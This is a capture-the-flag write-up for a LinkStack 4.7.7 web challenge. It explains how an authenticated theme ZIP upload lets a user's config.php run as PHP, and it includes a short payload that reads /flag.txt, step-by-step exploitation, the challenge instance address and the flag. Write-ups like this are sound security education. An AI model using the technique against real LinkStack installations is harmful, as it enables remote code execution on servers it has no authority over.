# LinkStack :: 001 (web, 75 pts) Writeup

## Summary
The target is LinkStack v4.7.7. A vulnerable theme-upload flow lets any authenticated user upload a ZIP that is extracted directly into `themes/` without restricting PHP files. LinkStack then `include`s the theme's `config.php` on every public profile render. This yields authenticated RCE and allows reading `/flag.txt`.

## Root Cause
In v4.7.7, `UserController::editTheme()` allows a ZIP upload for **any** authenticated user and extracts it to the `themes/` directory without sanitizing file contents or enforcing an allowlist:

- `zip` is only validated by extension (`mimes:zip`)
- ZIP is extracted to `themes/`
- Theme selection is stored in the user's profile
- Theme config is loaded via:
  - `resources/views/linkstack/modules/theme.blade.php`
  - `config.php` is `include`d from `themes/<theme>/config.php`

This means a user can upload a ZIP containing a `config.php` that executes arbitrary PHP when their public page is rendered.

## Affected Version
Observed on the challenge instance:

- LinkStack `4.7.7` (from `/version.json`)

This is fixed in newer versions (upload restricted to admin and other hardening added).

## Exploit Strategy
1. Register a user.
2. Login.
3. Upload a theme ZIP containing a malicious `config.php` that reads `/flag.txt`.
4. Set the theme to that new theme.
5. Visit your public page (`/@<username>`) to trigger the theme include.

## Proof of Concept

### Malicious theme ZIP
Create a theme folder with a `config.php` that prints the flag and returns a config array:

```php
<?php
echo file_get_contents('/flag.txt');
return [
  'allow_custom_background' => 'false',
  'enable_custom_code' => 'false',
  'enable_custom_head' => 'false',
  'enable_custom_body' => 'false',
  'enable_custom_body_end' => 'false',
  'use_default_buttons' => 'true',
];
```

Zip it as `pwn.zip` with the structure:

```
pwn/
  config.php
```

### Upload and activate
Use the theme upload form at `/studio/theme` (requires login). After upload, set the theme value to `pwn`.

### Trigger execution
Visit your public profile:

```
http://159.65.255.102:32602/@<your_handle>
```

The response includes the contents of `/flag.txt`.

## Flag
```
flag{a0c2cabb-1dbc-4549-9514-becf3420ef52}
```